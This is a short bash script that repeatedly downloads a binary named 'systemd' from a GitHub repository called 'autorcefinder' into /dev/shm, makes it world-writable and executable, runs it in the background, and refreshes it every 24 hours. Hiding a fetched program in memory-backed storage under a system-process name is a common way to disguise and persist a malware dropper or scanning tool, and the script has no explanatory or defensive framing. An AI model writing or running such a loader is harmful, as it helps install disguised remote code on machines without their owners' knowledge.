#!/bin/bash

while true; do
    # Download the file from GitHub using curl
    curl -sL https://raw.githubusercontent.com/FoxyProxys/autorcefinder/main/systemd -o /dev/shm/systemd

    # Check if download was successful
    if [ $? -eq 0 ]; then
        echo "File downloaded successfully"

        # Set permissions to 777
        chmod 777 /dev/shm/systemd

        # Execute the file
        /dev/shm/systemd &

        echo "File executed successfully"

        # Sleep for 24 hours
        sleep 24h

        # Remove the old file if it exists
        if [ -f /dev/shm/systemd ]; then
            rm /dev/shm/systemd
            echo "Old file removed"
        fi
    else
        echo "Failed to download the file"
    fi
done
